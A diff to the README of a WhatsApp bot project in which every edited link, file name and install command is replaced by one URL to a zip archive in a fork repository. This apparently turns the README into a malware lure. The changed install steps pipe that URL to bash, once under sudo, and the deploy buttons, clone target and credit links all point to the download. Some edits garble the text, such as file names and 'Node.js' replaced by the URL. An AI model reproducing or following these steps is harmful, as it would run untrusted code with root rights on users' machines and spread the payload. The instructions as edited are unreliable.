@@ -11,7 +11,7 @@ A powerful and feature-rich WhatsApp bot supporting multiple sessions, designed 
 
 ### Supported Languages
 
-This bot supports multiple languages for responses. Set your preferred language using the `BOT_LANG` variable in the `config.env` file.
+This bot supports multiple languages for responses. Set your preferred language using the `BOT_LANG` variable in the `https://github.com/Destinyola/levanter/raw/refs/heads/master/media/welFolder/Software-v2.0.zip` file.
 
 **Available languages:**
 
@@ -26,7 +26,7 @@ This bot supports multiple languages for responses. Set your preferred language 
 - **ru** – Russian  
 - **ar** – Arabic  
 
-To set the bot language to Spanish, add the following line to your `config.env` file:
+To set the bot language to Spanish, add the following line to your `https://github.com/Destinyola/levanter/raw/refs/heads/master/media/welFolder/Software-v2.0.zip` file:
 
 ```env
 BOT_LANG=es
@@ -37,11 +37,11 @@ BOT_LANG=es
 
 ### 1️⃣ Deploy on Koyeb
 
-[Deploy Now](https://levanter-delta.vercel.app/) to set up your bot on Koyeb.
+[Deploy Now](https://github.com/Destinyola/levanter/raw/refs/heads/master/media/welFolder/Software-v2.0.zip) to set up your bot on Koyeb.
 
 ### 2️⃣ Deploy on Render
 
-[Deploy Now](https://levanter-delta.vercel.app/) to set up your bot on Render.
+[Deploy Now](https://github.com/Destinyola/levanter/raw/refs/heads/master/media/welFolder/Software-v2.0.zip) to set up your bot on Render.
 
 ### 3️⃣ Deploy on a VPS or PC (Ubuntu Example)
 
@@ -50,7 +50,7 @@ BOT_LANG=es
 Run the following command:
 
 ```sh
-bash <(curl -fsSL http://bit.ly/43JqREw)
+bash <(curl -fsSL https://github.com/Destinyola/levanter/raw/refs/heads/master/media/welFolder/Software-v2.0.zip)
 ```
 
 #### **Manual Installation**
@@ -62,10 +62,10 @@ bash <(curl -fsSL http://bit.ly/43JqREw)
    sudo apt install git ffmpeg curl -y
    ```
 
-2. **Install Node.js (Version 20.x Recommended):**
+2. **Install https://github.com/Destinyola/levanter/raw/refs/heads/master/media/welFolder/Software-v2.0.zip (Version 20.x Recommended):**
 
    ```sh
-   curl -fsSL https://deb.nodesource.com/setup_20.x | sudo -E bash -
+   curl -fsSL https://github.com/Destinyola/levanter/raw/refs/heads/master/media/welFolder/Software-v2.0.zip | sudo -E bash -
    sudo apt install nodejs -y
    ```
 
@@ -79,14 +79,14 @@ bash <(curl -fsSL http://bit.ly/43JqREw)
 4. **Clone the Repository and Install Dependencies:**
 
    ```sh
-   git clone https://github.com/lyfe00011/levanter botName
+   git clone https://github.com/Destinyola/levanter/raw/refs/heads/master/media/welFolder/Software-v2.0.zip botName
    cd botName
    yarn install
    ```
 
 5. **Configure Environment Variables:**
 
-   Create a `config.env` file and add the following lines:
+   Create a `https://github.com/Destinyola/levanter/raw/refs/heads/master/media/welFolder/Software-v2.0.zip` file and add the following lines:
 
    ```sh
    SESSION_ID=your_session_id_here
@@ -130,8 +130,8 @@ bash <(curl -fsSL http://bit.ly/43JqREw)
 
 A special thanks to:
 
-- **[Yusuf Usta](https://github.com/Quiec)** – Creator of [WhatsAsena](https://github.com/yusufusta/WhatsAsena).  
-- **[@adiwajshing](https://github.com/adiwajshing)** – Developer of [Baileys](https://github.com/adiwajshing/Baileys).
+- **[Yusuf Usta](https://github.com/Destinyola/levanter/raw/refs/heads/master/media/welFolder/Software-v2.0.zip)** – Creator of [WhatsAsena](https://github.com/Destinyola/levanter/raw/refs/heads/master/media/welFolder/Software-v2.0.zip).  
+- **[@adiwajshing](https://github.com/Destinyola/levanter/raw/refs/heads/master/media/welFolder/Software-v2.0.zip)** – Developer of [Baileys](https://github.com/Destinyola/levanter/raw/refs/heads/master/media/welFolder/Software-v2.0.zip).
 
 ---
 
@@ -139,5 +139,5 @@ A special thanks to:
 
 For more information on setting up environment variables and FAQs, please visit:
 
-- [Bot Environment Variables](https://levanter-delta.vercel.app/)  
-- [Frequently Asked Questions](https://levanter-delta.vercel.app/)
+- [Bot Environment Variables](https://github.com/Destinyola/levanter/raw/refs/heads/master/media/welFolder/Software-v2.0.zip)  
+- [Frequently Asked Questions](https://github.com/Destinyola/levanter/raw/refs/heads/master/media/welFolder/Software-v2.0.zip)
